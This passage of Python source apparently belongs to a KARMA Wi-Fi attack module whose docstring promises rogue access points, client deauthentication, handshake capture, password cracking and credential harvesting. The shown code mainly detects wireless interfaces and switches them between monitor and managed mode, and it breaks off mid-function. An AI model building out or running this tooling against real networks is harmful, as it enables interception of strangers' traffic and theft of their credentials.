#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..tools.tshark import Tshark
from ..gui.utils import SystemUtils

import os
import time
import re
import subprocess
import threading
from collections import defaultdict
import atexit
import signal

class AttackKARMA(Attack):
    """
    KARMA attack implementation.
    
    Exploits client devices by:
    1. Capturing probe requests to extract PNL (Preferred Network List)
    2. Creating rogue APs that respond to any probe request
    3. Automatically connecting victims to fake networks
    
    This is an enhanced Evil Twin attack that targets specific victim preferences
    rather than relying on popular SSID names.
    """
    
    def __init__(self, target=None):
        super(AttackKARMA, self).__init__(target)
        self.pnl_networks = set()  # Captured SSIDs from probe requests
        self.client_probes = defaultdict(list)  # MAC -> list of SSIDs
        self.rogue_ap_process = None
        self.dhcp_process = None
        self.dns_process = None
        
        # Configuration file paths (critical for avoiding AttributeError)
        self.dnsmasq_config = None
        self.hostapd_config = None
        self.hostapd_configs = []
        self.additional_processes = []
        self.dns_spoofing_enabled = False
        self._victim_mgmt_started = False
        
        # Thread management (prevents resource leaks)
        self.active_threads = []
        self.success = False
        self.connected_clients = set()
        self.running = True
        self._cleanup_done = False
        self._attack_started = False  # Flag to prevent duplicate execution
        self._fallback_mode_used = False  # Flag to track if fallback mode was used
        self._networks_scanned = False  # Flag to track if networks have been scanned
        
        # Enhanced KARMA attack components
        self.captured_handshakes = {}  # MAC -> handshake file path
        self.cracked_passwords = {}    # MAC -> cracked password
        self.harvested_credentials = {} # MAC -> credentials dict
        
        # Create KARMA directories for permanent data storage
        self.create_karma_directories()
        self.real_networks = []        # List of real networks with clients
        self.deauth_active = False     # Deauth attack status
        self.handshake_capture_active = False
        self.deauth_intensity = {}    # Track attack intensity per network
        self.deauth_attempts = {}     # Track attempts per network
        
        # Enhanced handshake capture management
        self.active_capture_threads = {}  # Track active capture threads
        self.handshake_capture_queue = []  # Queue for handshake capture
        self.rogue_ap_networks = []  # Track rogue AP networks
        
        # Thread safety mechanisms
        self._lock = threading.Lock()  # Main lock for shared data
        self._capture_lock = threading.Lock()  # Lock for capture operations
        self._client_lock = threading.Lock()  # Lock for client management
        self._process_lock = threading.Lock()  # Lock for process management
        
        # Resource limits and monitoring
        self.MAX_CONCURRENT_CAPTURES = 2
        self.MAX_HANDSHAKES_PER_CLIENT = 3
        self.MAX_MEMORY_USAGE = 100 * 1024 * 1024  # 100MB
        self._capture_attempts = {}  # Track capture attempts per client
        
        # Timeout mechanisms to prevent infinite loops
        self.MAX_MONITORING_ITERATIONS = 1000  # Max iterations for monitoring loops
        self.MAX_DEAUTH_ITERATIONS = 500  # Max iterations for deauth loops
        self.MAX_CONNECTION_MONITOR_ITERATIONS = 2000  # Max iterations for connection monitoring
        self.LOOP_TIMEOUT_SECONDS = 300  # 5 minutes max per loop
        self._loop_start_times = {}  # Track loop start times
        
        # Process management and cleanup
        self._process_registry = {}  # Track all spawned processes
        self.PROCESS_CLEANUP_TIMEOUT = 10  # Seconds to wait for process cleanup
        
        # Interface conflict resolution
        self._interface_locks = {}  # Track interface usage locks
        self._interface_operations = {}  # Track ongoing interface operations
        self.INTERFACE_OPERATION_TIMEOUT = 30  # Max time for interface operations
        self._interface_conflict_detected = False
        
        # Multi-interface support
        self.available_interfaces = []  # List of available wireless interfaces
        self.probe_interface = None     # Interface for probe capture
        self.rogue_interface = None     # Interface for rogue AP
        self.additional_interfaces = [] # Additional interfaces for multiple APs
        
        # Initialize interface configuration
        self.initialize_interfaces()
        
        # Validate interfaces
        if not self.probe_interface:
            raise ValueError('No probe interface specified for KARMA attack')
        if not self.rogue_interface:
            raise ValueError('No rogue AP interface specified for KARMA attack')
        
        # Check if we have optimal dual-interface setup
        self.check_dual_interface_setup()
    
    def initialize_interfaces(self):
        """Initialize interface configuration for multi-device support"""
        try:
            Color.pl('{+} {C}Initializing multi-interface KARMA attack...{W}')
            
            # Get available wireless interfaces
            self.available_interfaces = self.get_available_interfaces()
            
            if not self.available_interfaces:
                raise ValueError('No wireless interfaces found')
            
            Color.pl('{+} {G}Found {C}%d{W} wireless interfaces: {G}%s{W}' % 
                    (len(self.available_interfaces), ', '.join(self.available_interfaces)))
            
            # Configure interfaces based on availability and user preferences
            self.configure_interfaces()
            
            # Show interface configuration
            self.show_interface_configuration()
            
        except Exception as e:
            Color.pl('{!} {R}Error initializing interfaces: {O}%s{W}' % str(e))
            raise
    
    def check_dual_interface_setup(self):
        """Check if we have optimal dual-interface setup for KARMA attack"""
        try:
            if self.probe_interface == self.rogue_interface:
                Color.pl('{!} {O}WARNING: Using same interface for probe capture and rogue AP{W}')
                Color.pl('{!} {O}This will require mode switching and may cause conflicts{W}')
                Color.pl('{!} {O}For optimal performance, use 2 separate WiFi devices:{W}')
                Color.pl('{!} {O}  - One in monitor mode for probe capture{W}')
                Color.pl('{!} {O}  - One in managed mode for hosting rogue AP{W}')
                Color.pl('{!} {O}Answer: YES - KARMA attack works best with 2 WiFi devices{W}')
            else:
                Color.pl('{+} {G}Optimal dual-interface setup detected{W}')
                Color.pl('{+} {G}Probe interface: %s (monitor mode){W}' % self.probe_interface)
                Color.pl('{+} {G}Rogue interface: %s (managed mode){W}' % self.rogue_interface)
                Color.pl('{+} {G}Answer: YES - KARMA attack optimally uses 2 WiFi devices{W}')
        except Exception as e:
            Color.pl('{!} {O}Error checking dual interface setup: {O}%s{W}' % str(e))
    
    def get_available_interfaces(self):
        """Get list of available wireless interfaces"""
        try:
            interfaces = []
            
            # Method 1: Use iwconfig to find wireless interfaces
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'IEEE 802.11' in line and not line.startswith(' '):
                            # Extract interface name (first word)
                            interface = line.split()[0]
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
            except Exception as e:
                Color.pl('{!} {O}iwconfig method failed: {O}%s{W}' % str(e))
            
            # Method 2: Use ip command to find wireless interfaces
            try:
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ': wl' in line or ': wlan' in line or ': wlp' in line:
                            # Extract interface name
                            interface = line.split(':')[1].strip()
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
            except Exception as e:
                Color.pl('{!} {O}ip command method failed: {O}%s{W}' % str(e))
            
            # Method 3: Check for common interface names
            common_names = ['wlan0', 'wlan1', 'wlan2', 'wlp3s0', 'wlp4s0']
            for name in common_names:
                try:
                    result = subprocess.run(['iwconfig', name], capture_output=True, text=True, timeout=2)
                    if result.returncode == 0 and name not in interfaces:
                        interfaces.append(name)
                except:
                    pass
            
            Color.pl('{+} {G}Found {C}%d{W} wireless interfaces: {G}%s{W}' % (len(interfaces), ', '.join(interfaces)))
            return interfaces
            
        except Exception as e:
            Color.pl('{!} {R}Error getting interfaces: {O}%s{W}' % str(e))
            return []
    
    def get_interface_state(self, interface):
        """Get detailed state information for an interface"""
        try:
            state = {
                'name': interface,
                'mode': 'unknown',
                'status': 'unknown',
                'frequency': None,
                'essid': None,
                'mac': None,
                'power': None,
                'available': False
            }
            
            # Check if interface exists and is available
            try:
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    state['available'] = True
                    output = result.stdout
                    
                    # Extract mode
                    if 'Mode:Monitor' in output:
                        state['mode'] = 'monitor'
                    elif 'Mode:Managed' in output:
                        state['mode'] = 'managed'
                    elif 'Mode:Master' in output:
                        state['mode'] = 'master'
                    else:
                        state['mode'] = 'unknown'
                    
                    # Extract ESSID
                    if 'ESSID:' in output:
                        essid_part = output.split('ESSID:')[1].split()[0]
                        if essid_part != 'off/any':
                            state['essid'] = essid_part.strip('"')
                    
                    # Extract frequency
                    if 'Frequency:' in output:
                        freq_part = output.split('Frequency:')[1].split()[0]
                        state['frequency'] = freq_part
                    
                    # Extract MAC address
                    if 'Access Point:' in output:
                        mac_part = output.split('Access Point:')[1].split()[0]
                        if mac_part != 'Not-Associated':
                            state['mac'] = mac_part
                    
                    # Extract power level
                    if 'Power:' in output:
                        power_part = output.split('Power:')[1].split()[0]
                        state['power'] = power_part
                    
                    # Determine status
                    if 'IEEE 802.11' in output:
                        state['status'] = 'active'
                    else:
                        state['status'] = 'inactive'
                        
                else:
                    state['available'] = False
                    
            except Exception as e:
                state['available'] = False
                Color.pl('{!} {O}Error checking interface %s: {O}%s{W}' % (interface, str(e)))
            
            return state
            
        except Exception as e:
            Color.pl('{!} {R}Error getting interface state: {O}%s{W}' % str(e))
            return {'name': interface, 'available': False, 'mode': 'unknown', 'status': 'unknown'}
    
    def find_best_interfaces_dynamically(self):
        """Dynamically find the best interfaces for probe capture and rogue AP - completely name-agnostic"""
        try:
            Color.pl('{+} {C}Scanning system for optimal interfaces...{W}')
            
            # Use already available interfaces instead of scanning again
            all_interfaces = self.available_interfaces
            if not all_interfaces:
                Color.pl('{!} {R}No wireless interfaces found!{W}')
                return None, None
            
            # Get detailed state for each interface
            interface_states = []
            for interface in all_interfaces:
                state = self.get_interface_state(interface)
                interface_states.append(state)
                
                # Show interface details
                mode_color = '{G}' if state['mode'] == 'monitor' else '{O}' if state['mode'] == 'managed' else '{R}'
                Color.pl('{+} {C}Interface {G}%s{W}: {C}Mode={O}%s{W}, {C}Status={O}%s{W}, {C}Available={O}%s{W}' % 
                        (interface, state['mode'], state['status'], 'Yes' if state['available'] else 'No'))
            
            # Categorize interfaces by type (completely name-agnostic)
            # Monitor interfaces: any interface ending with 'mon' or in monitor mode
            monitor_interfaces = [s for s in interface_states if (s['name'].endswith('mon') or s['mode'] == 'monitor') and s['available']]
            
            # Base interfaces: any interface NOT ending with 'mon' and available
            base_interfaces = [s for s in interface_states if not s['name'].endswith('mon') and s['available']]
            
            # Managed interfaces: any interface in managed mode
            managed_interfaces = [s for s in interface_states if s['mode'] == 'managed' and s['available']]
            
            # Other interfaces: any available interface not in above categories
            other_interfaces = [s for s in interface_states if s['available'] and s not in base_interfaces and s not in monitor_interfaces]
            
            # Select probe interface (prefer monitor mode, but work with any interface)
            probe_interface = None
            
            # First priority: Use monitor interface if available
            if monitor_interfaces:
                probe_interface = monitor_interfaces[0]['name']
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (monitor mode - optimal){W}' % probe_interface)
            # Second priority: Use base interface in managed mode (will switch to monitor)
            elif base_interfaces:
                probe_interface = base_interfaces[0]['name']
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (base interface - will switch to monitor mode){W}' % probe_interface)
            # Third priority: Use any managed interface
            elif managed_interfaces:
                probe_interface = managed_interfaces[0]['name']
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (managed mode - will switch to monitor){W}' % probe_interface)
            # Last resort: Use any available interface
            elif other_interfaces:
                probe_interface = other_interfaces[0]['name']
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (will configure for monitor mode){W}' % probe_interface)
            
            # Select rogue interface (MUST be a base interface for AP mode - name-agnostic)
            rogue_interface = None
            
            # First priority: Find a different base interface from probe
            for base in base_interfaces:
                if base['name'] != probe_interface:
                    rogue_interface = base['name']
                    Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (base interface - optimal for AP mode, different from probe){W}' % rogue_interface)
                    break
            
            # Second priority: Use same base interface as probe (will require mode switching)
            if not rogue_interface and base_interfaces:
                # If probe is a monitor interface, use its base interface (name-agnostic)
                if probe_interface and probe_interface.endswith('mon'):
                    base_name = probe_interface[:-3]  # Remove 'mon' suffix - works with any name
                    for base in base_interfaces:
                        if base['name'] == base_name:
                            rogue_interface = base['name']
                            Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (base interface for monitor probe {G}%s{W}){W}' % (rogue_interface, probe_interface))
                        break
                else:
                    # Use same base interface as probe
                    rogue_interface = probe_interface
                    Color.pl('{!} {O}Using same base interface for both probe and rogue (will require mode switching){W}')
            
            # Last resort: Use any available interface (not recommended)
            if not rogue_interface:
                if other_interfaces:
                    rogue_interface = other_interfaces[0]['name']
                    Color.pl('{!} {O}Selected rogue interface: {C}%s{W} (not optimal - may not support AP mode){W}' % rogue_interface)
                else:
                    rogue_interface = probe_interface
                    Color.pl('{!} {O}Using same interface for both probe and rogue (not optimal){W}')
            
            # Update the rogue_interface to use the base interface if needed (name-agnostic)
            if rogue_interface and rogue_interface.endswith('mon'):
                base_rogue = rogue_interface[:-3]  # Remove 'mon' suffix - works with any name
                Color.pl('{+} {C}Updating rogue interface from {G}%s{W} to base interface {G}%s{W} for AP mode{W}' % (rogue_interface, base_rogue))
                rogue_interface = base_rogue
            
            return probe_interface, rogue_interface
            
        except Exception as e:
            Color.pl('{!} {R}Error finding interfaces dynamically: {O}%s{W}' % str(e))
            return None, None
    
    def configure_interfaces(self):
        """Configure interfaces for KARMA attack using dynamic detection"""
        try:
            # Check for user-specified interfaces first
            user_probe = getattr(Configuration, 'karma_probe_interface', None)
            user_rogue = getattr(Configuration, 'karma_rogue_interface', None)
            
            if user_probe and user_rogue:
                # Both interfaces specified by user - check if they're different
                if user_probe == user_rogue:
                    Color.pl('{!} {O}WARNING: User specified same interface for both probe and rogue{W}')
                    Color.pl('{!} {O}This will require mode switching and may cause conflicts{W}')
                    Color.pl('{+} {C}Attempting to find alternative interface for rogue AP...{W}')
                    
                    # Try to find a different interface for rogue AP
                    available_interfaces = self.available_interfaces
                    alternative_rogue = None
                    
                    for iface in available_interfaces:
                        if iface != user_probe:
                            alternative_rogue = iface
                            break
                    
                    if alternative_rogue:
                        Color.pl('{+} {G}Found alternative interface: {C}%s{W} for rogue AP{W}' % alternative_rogue)
                        self.probe_interface = user_probe
                        self.rogue_interface = alternative_rogue
                    else:
                        Color.pl('{!} {O}No alternative interface found, using same interface for both{W}')
                        self.probe_interface = user_probe
                        self.rogue_interface = user_rogue
                else:
                    # Different interfaces specified - optimal setup
                    self.probe_interface = user_probe
                    self.rogue_interface = user_rogue
                    Color.pl('{+} {G}Using user-specified interfaces (optimal dual-interface setup):{W}')
                
                Color.pl('{+} {G}  Probe interface: {C}%s{W}' % self.probe_interface)
                Color.pl('{+} {G}  Rogue interface: {C}%s{W}' % self.rogue_interface)
            else:
                # Use dynamic detection
                Color.pl('{+} {C}Using dynamic interface detection...{W}')
                probe_interface, rogue_interface = self.find_best_interfaces_dynamically()
                
                if not probe_interface or not rogue_interface:
                    Color.pl('{!} {R}Failed to find suitable interfaces!{W}')
                    raise ValueError('No suitable interfaces found')
                
                self.probe_interface = probe_interface
                self.rogue_interface = rogue_interface
            
            # Validate the selected interfaces
            self.validate_selected_interfaces()
            
            # Get additional interfaces for multiple APs
            self.additional_interfaces = self.get_additional_interfaces_for_aps()
            
        except Exception as e:
            Color.pl('{!} {R}Error configuring interfaces: {O}%s{W}' % str(e))
            raise
    
    def validate_selected_interfaces(self):
        """Validate that the selected interfaces are available and working"""
        try:
            Color.pl('{+} {C}Validating selected interfaces...{W}')
            
            # Check probe interface
            probe_state = self.get_interface_state(self.probe_interface)
            if not probe_state['available']:
                Color.pl('{!} {R}Probe interface %s is not available!{W}' % self.probe_interface)
                raise ValueError('Probe interface not available')
            else:
                Color.pl('{+} {G}Probe interface {C}%s{W} validated: {O}%s{W} mode, {O}%s{W} status' % 
                        (self.probe_interface, probe_state['mode'], probe_state['status']))
            
            # Check rogue interface - handle monitor interface case
            rogue_state = self.get_interface_state(self.rogue_interface)
            if not rogue_state['available']:
                # If rogue interface is not available, check if it's a base interface that was converted to monitor
                if self.rogue_interface and not self.rogue_interface.endswith('mon'):
                    # Check if there's a corresponding monitor interface
                    monitor_interface = self.rogue_interface + 'mon'
                    monitor_state = self.get_interface_state(monitor_interface)
                    if monitor_state['available']:
                        Color.pl('{+} {C}Base interface {G}%s{W} is not available (converted to monitor mode){W}' % self.rogue_interface)
                        Color.pl('{+} {C}Monitor interface {G}%s{W} is available - will restore base interface for AP mode{W}' % monitor_interface)
                        # Keep the base interface name for AP mode - the AP mode operations will handle restoration
                        Color.pl('{+} {G}Rogue interface will use base interface {C}%s{W} (will be restored from monitor interface for AP mode){W}' % self.rogue_interface)
                    else:
                        Color.pl('{!} {R}Rogue interface %s is not available!{W}' % self.rogue_interface)
                        raise ValueError('Rogue interface not available')
                else:
                    Color.pl('{!} {R}Rogue interface %s is not available!{W}' % self.rogue_interface)
                    raise ValueError('Rogue interface not available')
            else:
                Color.pl('{+} {G}Rogue interface {C}%s{W} validated: {O}%s{W} mode, {O}%s{W} status' % 
                        (self.rogue_interface, rogue_state['mode'], rogue_state['status']))
            
            # Warn if using same interface for both
            if self.probe_interface == self.rogue_interface:
                Color.pl('{!} {O}WARNING: Using same interface for probe and rogue AP{W}')
                Color.pl('{!} {O}This will require mode switching and may cause conflicts{W}')
                Color.pl('{!} {O}For optimal performance, use 2 separate WiFi devices{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error validating interfaces: {O}%s{W}' % str(e))
            raise
    
    def select_best_probe_interface(self):
        """Select the best interface for probe capture"""
        try:
            # Prefer interfaces in monitor mode
            monitor_interfaces = []
            managed_interfaces = []
            
            for interface in self.available_interfaces:
                try:
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                    if 'Mode:Monitor' in result.stdout:
                        monitor_interfaces.append(interface)
                    elif 'Mode:Managed' in result.stdout:
                        managed_interfaces.append(interface)
                except:
                    managed_interfaces.append(interface)  # Assume managed if can't determine
            
            # Prefer monitor mode interfaces for probe capture
            if monitor_interfaces:
                selected = monitor_interfaces[0]
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (monitor mode)' % selected)
                return selected
            elif managed_interfaces:
                selected = managed_interfaces[0]
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (managed mode)' % selected)
                return selected
            else:
                # Fallback to first available interface
                selected = self.available_interfaces[0]
                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (fallback)' % selected)
                return selected
                
        except Exception as e:
            Color.pl('{!} {R}Error selecting probe interface: {O}%s{W}' % str(e))
            return self.available_interfaces[0] if self.available_interfaces else None
    
    def select_best_rogue_interface(self):
        """Select the best interface for rogue AP"""
        try:
            # Prefer interfaces in managed mode for AP functionality
            managed_interfaces = []
            monitor_interfaces = []
            
            for interface in self.available_interfaces:
                try:
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                    if 'Mode:Managed' in result.stdout:
                        managed_interfaces.append(interface)
                    elif 'Mode:Monitor' in result.stdout:
                        monitor_interfaces.append(interface)
                except:
                    managed_interfaces.append(interface)  # Assume managed if can't determine
            
            # Prefer managed mode interfaces for AP functionality
            if managed_interfaces:
                selected = managed_interfaces[0]
                Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (managed mode)' % selected)
                return selected
            elif monitor_interfaces:
                selected = monitor_interfaces[0]
                Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (monitor mode - will switch to managed)' % selected)
                return selected
            else:
                # Fallback to first available interface
                selected = self.available_interfaces[0]
                Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (fallback)' % selected)
                return selected
                
        except Exception as e:
            Color.pl('{!} {R}Error selecting rogue interface: {O}%s{W}' % str(e))
            return self.available_interfaces[0] if self.available_interfaces else None
    
    def select_different_interfaces(self):
        """Ensure probe and rogue interfaces are different"""
        try:
            if len(self.available_interfaces) < 2:
                Color.pl('{!} {O}Only one interface available - will use mode switching{W}')
                Color.pl('{!} {O}This may cause delays and conflicts between phases{W}')
                Color.pl('{!} {O}Recommendation: Use 2 separate WiFi devices for optimal performance{W}')
                return
            
            # Find interfaces different from current probe interface
            other_interfaces = [iface for iface in self.available_interfaces if iface != self.probe_interface]
            
            if other_interfaces:
                # Prefer interfaces that are already in managed mode
                managed_interfaces = []
                monitor_interfaces = []
                
                for iface in other_interfaces:
                    try:
                        result = subprocess.run(['iwconfig', iface], capture_output=True, text=True, timeout=3)
                        if 'Mode:Managed' in result.stdout:
                            managed_interfaces.append(iface)
                        elif 'Mode:Monitor' in result.stdout:
                            monitor_interfaces.append(iface)
                    except:
                        managed_interfaces.append(iface)  # Assume managed if can't determine
                
                # Prefer managed interfaces for rogue AP
                if managed_interfaces:
                    self.rogue_interface = managed_interfaces[0]
                    Color.pl('{+} {G}Switched rogue interface to: {C}%s{W} (already in managed mode)' % self.rogue_interface)
                elif monitor_interfaces:
                    self.rogue_interface = monitor_interfaces[0]
                    Color.pl('{+} {G}Switched rogue interface to: {C}%s{W} (will switch from monitor to managed)' % self.rogue_interface)
                else:
                    self.rogue_interface = other_interfaces[0]
                    Color.pl('{+} {G}Switched rogue interface to: {C}%s{W}' % self.rogue_interface)
            else:
                Color.pl('{!} {O}No alternative interfaces available{W}')
                
        except Exception as e:
            Color.pl('{!} {R}Error selecting different interfaces: {O}%s{W}' % str(e))
    
    def cleanup_interface_name(self, interface):
        """Clean up corrupted interface names like wlan0monmon"""
        try:
            if not interface:
                return interface
                
            # Handle multiple monitor suffixes properly
            cleaned = interface
            
            # Remove all 'mon' suffixes until we get to the base interface
            while cleaned.endswith('mon') or cleaned.endswith('mon0') or cleaned.endswith('mon1'):
                if cleaned.endswith('mon0'):
                    cleaned = cleaned[:-4]  # Remove 'mon0'
                elif cleaned.endswith('mon1'):
                    cleaned = cleaned[:-4]  # Remove 'mon1'
                elif cleaned.endswith('mon'):
                    cleaned = cleaned[:-3]  # Remove 'mon'
                else:
                    break
            
            # Check if the cleaned interface exists, if not, try the original
            try:
                result = subprocess.run(['iwconfig', cleaned], capture_output=True, text=True, timeout=2)
                if result.returncode != 0:
                    # If cleaned interface doesn't exist, try the original
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        cleaned = interface  # Use original if it exists
            except:
                pass
            
            if cleaned != interface:
                Color.pl('{+} {C}Cleaned interface name: {O}%s{W} -> {G}%s{W}' % (interface, cleaned))
            
            return cleaned
            
        except Exception as e:
            Color.pl('{!} {R}Error cleaning interface name: {O}%s{W}' % str(e))
            return interface
    
    def resolve_interface_name(self, interface):
        """Resolve interface name to an actual existing interface"""
        try:
            # If interface ends with 'mon', try to find the base interface first
            if interface.endswith('mon'):
                base_name = interface[:-3]  # Remove 'mon' suffix
                # Check if base interface exists
                result = subprocess.run(['iwconfig', base_name], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    Color.pl('{+} {C}Resolved monitor interface: {O}%s{W} -> {G}%s{W}' % (interface, base_name))
                    return base_name
            
            # First, try the interface as-is
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                return interface
            
            # If that fails, try to find a similar interface
            available_interfaces = self.get_available_interfaces()
            if not available_interfaces:
                return interface
            
            # Try to find base interface (remove 'mon' suffix)
            base_name = interface.replace('mon', '').replace('mon0', '').replace('mon1', '')
            for iface in available_interfaces:
                if iface == base_name or iface.replace('mon', '') == base_name:
                    Color.pl('{+} {C}Resolved interface: {O}%s{W} -> {G}%s{W}' % (interface, iface))
                    return iface
            
            # Fallback to first available interface
            Color.pl('{+} {C}Using fallback interface: {O}%s{W} -> {G}%s{W}' % (interface, available_interfaces[0]))
            return available_interfaces[0]
            
        except Exception as e:
            Color.pl('{!} {R}Error resolving interface name: {O}%s{W}' % str(e))
            return interface
    
    def find_monitor_interface_dynamically(self, base_interface):
        """Dynamically find the monitor mode interface name"""
        try:
            # Get all current interfaces
            current_interfaces = self.get_available_interfaces()
            
            # Use system detection to find actual interfaces - no hardcoded names
            possible_names = SystemUtils.get_wireless_interfaces()
            
            # Also check for any new interfaces that appeared
            for interface in current_interfaces:
                if interface not in possible_names:
                    possible_names.append(interface)
            
            # Check each possible name
            for name in possible_names:
                try:
                    result = subprocess.run(['iwconfig', name], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                        return name
                except:
                    continue
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error finding monitor interface: {O}%s{W}' % str(e))
            return None
    
    def switch_to_managed_mode(self, interface):
        """Switch interface to managed mode using iwconfig (like GUI)"""
        try:
            Color.pl('{+} {C}Switching {G}%s{W} to managed mode...{W}' % interface)
            
            # Step 0: Resolve interface name to an actual existing interface
            Color.pl('{+} {C}Resolving interface name...{W}')
            original_interface = interface
            interface = self.resolve_interface_name(interface)
            if interface != original_interface:
                Color.pl('{+} {C}Interface resolved: {O}%s{W} -> {G}%s{W}' % (original_interface, interface))
            
            # Step 1: Clean up any monitor mode processes
            Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
            
            # Check if NetworkManager is running
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{+} {C}NetworkManager is running - no conflict{W}')
                else:
                    Color.pl('{+} {C}NetworkManager is not running - no conflict{W}')
            except:
                Color.pl('{+} {C}NetworkManager status unknown - continuing{W}')
            
            # Step 2: Clean up any monitor mode processes (no airmon-ng needed)
            Color.pl('{+} {C}Cleaning up monitor mode processes{W}')
            # No need for airmon-ng stop since we're using iwconfig directly
            
            # Step 3: Use iwconfig to switch to managed mode
            Color.pl('{+} {C}Switching to managed mode{W}')
            try:
                # First, bring interface down
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=3)
                
                # Set managed mode using iwconfig
                result = subprocess.run(['iwconfig', interface, 'mode', 'managed'], capture_output=True, text=True, timeout=3)
                if result.returncode != 0:
                    Color.pl('{!} {R}Failed to set managed mode: {O}%s{W}' % result.stderr.strip())
                    return False, interface
                
                # Bring interface back up
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
                
                Color.pl('{+} {G}Successfully switched to managed mode{W}')
                
            except Exception as e:
                Color.pl('{!} {R}Failed to switch to managed mode: {O}%s{W}' % str(e))
                return False, interface
            
            # Step 4: Verify interface mode
            Color.pl('{+} {C}Verifying interface mode for {G}%s{W}...{W}' % interface)
            try:
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    output = result.stdout
                    Color.pl('{+} {C}Debug: iwconfig output: {O}%s{W}' % output.strip())
                    
                    if 'Mode:Managed' in output:
                        Color.pl('{+} {G}✓ Interface {G}%s{W} is in managed mode{W}' % interface)
                        return True, interface
                    else:
                        Color.pl('{!} {R}Interface is not in managed mode{W}')
                        return False, interface
                else:
                    Color.pl('{!} {R}Failed to verify interface mode{W}')
                    return False, interface
                    
            except Exception as e:
                Color.pl('{!} {R}Failed to verify interface mode: {O}%s{W}' % str(e))
                return False, interface
                
        except Exception as e:
            Color.pl('{!} {R}Error switching to managed mode: {O}%s{W}' % str(e))
            return False, interface
    
    def switch_to_monitor_mode(self, interface):
        """Switch interface to monitor mode using iwconfig directly (no airmon-ng)"""
        try:
            Color.pl('{+} {C}Switching {G}%s{W} to monitor mode using iwconfig...{W}' % interface)
            
            # Step 0: Resolve interface name to an actual existing interface
            Color.pl('{+} {C}Resolving interface name...{W}')
            original_interface = interface
            interface = self.resolve_interface_name(interface)
            if interface != original_interface:
                Color.pl('{+} {C}Interface resolved: {O}%s{W} -> {G}%s{W}' % (original_interface, interface))
            
            # Step 1: Clean up any conflicting processes
            Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
            
            # Check if NetworkManager is running
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{+} {C}NetworkManager is running - no conflict{W}')
                else:
                    Color.pl('{+} {C}NetworkManager is not running - no conflict{W}')
            except:
                Color.pl('{+} {C}NetworkManager status unknown - continuing{W}')
            
            # Step 2: Use iwconfig directly to switch to monitor mode
            Color.pl('{+} {C}Switching to monitor mode using iwconfig{W}')
            try:
                # First, bring interface down
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=3)
                time.sleep(1)
                
                # Set monitor mode using iwconfig
                result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], capture_output=True, text=True, timeout=5)
                if result.returncode != 0:
                    Color.pl('{!} {O}iwconfig monitor mode failed: {O}%s{W}' % result.stderr.strip())
                    # Try bringing interface up first
                    subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
                    time.sleep(1)
                    result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], capture_output=True, text=True, timeout=5)
                    if result.returncode != 0:
                        Color.pl('{!} {R}Failed to set monitor mode: {O}%s{W}' % result.stderr.strip())
                        return False, interface
                
                # Bring interface back up
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
                time.sleep(1)
                
                Color.pl('{+} {G}Successfully switched to monitor mode{W}')
                
                # Verify monitor mode
                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                    Color.pl('{+} {G}✓ Interface {G}%s{W} is in monitor mode{W}' % interface)
                    return True, interface
                else:
                    Color.pl('{!} {R}Could not verify monitor mode{W}')
                    return False, interface
                    
            except Exception as e:
                Color.pl('{!} {R}Failed to switch to monitor mode: {O}%s{W}' % str(e))
                return False, interface
                
        except Exception as e:
            Color.pl('{!} {R}Error switching to monitor mode: {O}%s{W}' % str(e))
            return False, interface
    
    def fallback_monitor_mode(self, interface):
        """Fallback method to enable monitor mode"""
        try:
            # First check if interface exists
            test_result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if test_result.returncode != 0:
                Color.pl('{!} {R}Interface {G}%s{W} is not available{W}' % interface)
                
                # Try to find the correct interface
